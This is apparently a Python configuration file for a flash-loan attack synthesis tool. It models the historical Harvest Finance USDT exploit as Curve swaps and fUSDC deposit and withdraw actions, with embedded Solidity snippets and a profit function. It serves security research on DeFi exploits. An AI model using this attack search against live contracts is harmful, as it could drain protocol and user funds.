import sys
import os
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
sys.path.append(os.path.dirname(os.path.dirname(SCRIPT_DIR)))

from Actions.macros import *
from Actions.Utils import *
from Actions.UtilsPrecision import *
from Actions.Action import *
from Actions.AttackDAG import *
from FlashSynProActions.ActionPro import *
from synthesizer import *


class HarvestUSDTAction(ActionPro):
    # Capital the historical exploit flash-loaned; profit is measured against these.
    initialBalances = {"USDT": 18308555.417594, "USDC": 50000000}  # keep consistent with the foundry script

    currentBalances = initialBalances.copy()  # Don't change

    # Both legs are USD stablecoins, so profit is just the summed balance change.
    TokenPrices = {"USDT": 1.0, "USDC": 1.0}

    TargetTokens = TokenPrices.keys()    # Don't change: tokens of interest

    # No start_str literal: the engine reads the harness preamble straight from
    # examples/harvest_usdt/attack.t.sol (copied into src/foundryModule/src/test/).
    # See ActionPro.start_str and forge/forgeCollectDVD.py.

    # stats = [USDT balance, USDC balance] (whole tokens), parsed from profitSummary().
    def calcProfit(stats):
        if stats == None or len(stats) != 2:
            return 0
        return (stats[0] - HarvestUSDTAction.initialBalances['USDT']) \
             + (stats[1] - HarvestUSDTAction.initialBalances['USDC'])

    @classmethod
    def initialPass(cls, actionList, actionDependencies, ActionWrapper, maxLen = None):
        if maxLen == None:
            largestLen = 0
            for actionDependency in actionDependencies:
                if len(actionDependency) > largestLen:
                    largestLen = len(actionDependency)
            maxLen = largestLen

        action_list_1 = actionList
        actionSpecs = []
        for ii in range(len(actionDependencies)):
            temp = actionDependencies[ii] + [actionList[ii]]
            actionSpecs.append( temp )
        start = time.time()
        initialPassCollectData4( actionSpecs , ActionWrapper, TargetDataPoints = 500, maxLenGlobal = maxLen)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    @classmethod
    def runinitialPass(cls):
        map = loadDataPoints()
        helpMap = {}
        for key in map.keys():
            payload = map[key]
            if len(payload) < 3:
                sys.exit("stale data file '{}.pkl' (pre-registry format); "
                         "re-run data collection".format(key))
            points, values, names = payload[0], payload[1], payload[2]
            actionStr = names[-1]
            actionList = [cls.action_by_name(n) for n in names]
            if len(points) > 0:
                helpMap.setdefault(actionStr, {})[key] = (actionList, [points, values])
        for actionStr in helpMap.keys():
            approx = NumericalApproximatorsPro(helpMap[actionStr])
            target = cls.action_by_name(actionStr)
            target.approximators = approx
            target.approximators.refreshTransitFormula()


class Curve_USDT2USDC(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['USDC']
    range = [0, 20000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: Curve_USDT2USDC
        CURVE.exchange_underlying(2, 1, $$ * 1e6, 0);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect Curve_USDT2USDC: USDT --> USDC
        uint USDCgot = USDC.balanceOf(address(attacker));
        CURVE.exchange_underlying(2, 1, $$ * 1e6, 0);
        USDCgot = USDC.balanceOf(address(attacker)) - USDCgot;
        revert(Strings.append("FlashSyn: ", USDCgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDT"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["USDC"] += output0
        return


class Curve_USDC2USDT(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['USDT']
    range = [0, 20000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: Curve_USDC2USDT
        CURVE.exchange_underlying(1, 2, $$ * 1e6, 0);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect Curve_USDC2USDT: USDC --> USDT
        uint USDTgot = USDT.balanceOf(address(attacker));
        CURVE.exchange_underlying(1, 2, $$ * 1e6, 0);
        USDTgot = USDT.balanceOf(address(attacker)) - USDTgot;
        revert(Strings.append("FlashSyn: ", USDTgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["USDT"] += output0
        return


class fUSDC_deposit(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['fUSDC']
    range = [0, 50000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: fUSDC_deposit
        fUSDC.deposit($$ * 1e6);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect fUSDC_deposit: USDC --> fUSDC
        uint fUSDCgot = fUSDC.balanceOf(address(attacker));
        fUSDC.deposit($$ * 1e6);
        fUSDCgot = fUSDC.balanceOf(address(attacker)) - fUSDCgot;
        revert(Strings.append("FlashSyn: ", fUSDCgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        if "fUSDC" not in cls.currentBalances:
            cls.currentBalances["fUSDC"] = 0
        cls.currentBalances["fUSDC"] += output0
        return


class fUSDC_withdraw(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['fUSDC']
    tokensOut = ['USDC']
    range = [0, 60000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: fUSDC_withdraw
        fUSDC.withdraw($$ * 1e6);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect fUSDC_withdraw: fUSDC --> USDC
        uint USDCgot = USDC.balanceOf(address(attacker));
        fUSDC.withdraw($$ * 1e6);
        USDCgot = USDC.balanceOf(address(attacker)) - USDCgot;
        revert(Strings.append("FlashSyn: ", USDCgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["fUSDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["USDC"] += output0
        return


# Longest attack sequence the synthesizer searches (the known exploit is length 4).
MAX_SYNTHESIS_LEN = 4


def flashsyn_setup():
    """Wire up config + the action DAG. Returns the pieces the flashsyn CLI drives.

    The CLI (flashsyn.py) calls this once, then runs either data collection or
    synthesis — no more editing main() to toggle between the two.
    """
    config.ExecutionMode = DVD
    config.command = "./run.sh Harvest_USDT ETH 11129474"
    config.benchmarkName = "harvest_usdt"

    action1 = Curve_USDT2USDC
    action2 = Curve_USDC2USDT
    action3 = fUSDC_deposit
    action4 = fUSDC_withdraw
    action_list = [action1, action2, action3, action4]

    # If unsure about prestates, list all other actions (safe default).
    action1_prestate_dependency = [action2, action3, action4] + [action1]
    action2_prestate_dependency = [action1, action3, action4] + [action2]
    action3_prestate_dependency = [action1, action2, action4] + [action3]
    action4_prestate_dependency = [action1, action2, action3] + [action4]
    actionDependencies = [action1_prestate_dependency, action2_prestate_dependency,
                          action3_prestate_dependency, action4_prestate_dependency]

    attackDAGGenerator.setActionDependency(generateActionDependency(action_list, actionDependencies))

    return {"wrapper": HarvestUSDTAction, "actions": action_list,
            "dependencies": actionDependencies, "max_len": MAX_SYNTHESIS_LEN}


def main():
    # Preferred entrypoint: `python3 flashsyn.py collect harvest_usdt`.
    # Running this file directly still does one data-collection pass.
    setup = flashsyn_setup()
    setup["wrapper"].initialPass(setup["actions"], setup["dependencies"], setup["wrapper"])


if __name__ == "__main__":
    main()
